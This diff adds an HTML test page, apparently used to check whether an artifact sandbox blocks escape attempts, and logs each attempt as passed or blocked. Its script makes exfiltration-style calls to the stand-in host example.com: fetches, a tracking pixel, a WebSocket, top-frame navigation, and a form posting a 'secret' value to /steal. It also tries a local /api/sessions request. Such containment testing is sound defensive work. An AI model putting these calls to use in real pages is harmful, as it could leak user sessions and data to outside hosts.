@@ -1,0 +1,22 @@
+<!-- redgiant-artifact {"name":"Prova ostile","version":1} -->
+<!doctype html>
+<html><head><title>Ostile</title></head>
+<body>
+<h1>Prova ostile</h1>
+<ul id="log"></ul>
+<form id="f" action="https://example.com/steal" method="post"><input name="x" value="segreto"></form>
+<script>
+const out = (k, v) => { const li = document.createElement("li"); li.dataset.k = k; li.textContent = k + ": " + v; document.getElementById("log").append(li); };
+(async () => {
+  try { await fetch("https://example.com/?d=1"); out("fetch", "PASSED"); } catch (e) { out("fetch", "blocked"); }
+  try { await fetch("/api/sessions"); out("fetch-local", "PASSED"); } catch (e) { out("fetch-local", "blocked"); }
+  await new Promise((ok) => { const i = new Image(); i.onload = () => { out("img", "PASSED"); ok(); }; i.onerror = () => { out("img", "blocked"); ok(); }; i.src = "https://example.com/pixel.png?d=1"; });
+  await new Promise((ok) => { try { const w = new WebSocket("wss://example.com/"); w.onopen = () => { out("ws", "PASSED"); ok(); }; w.onerror = () => { out("ws", "blocked"); ok(); }; } catch (e) { out("ws", "blocked"); ok(); } });
+  const w = window.open("https://example.com/?d=1"); out("open", w ? "PASSED" : "blocked");
+  try { localStorage.setItem("a", "1"); out("storage", "PASSED"); } catch (e) { out("storage", "blocked"); }
+  try { top.location.href = "https://example.com/?d=1"; out("top", "PASSED?"); } catch (e) { out("top", "blocked"); }
+  try { document.getElementById("f").submit(); out("form", "sent?"); } catch (e) { out("form", "blocked"); }
+  out("done", "yes");
+})();
+</script>
+</body></html>
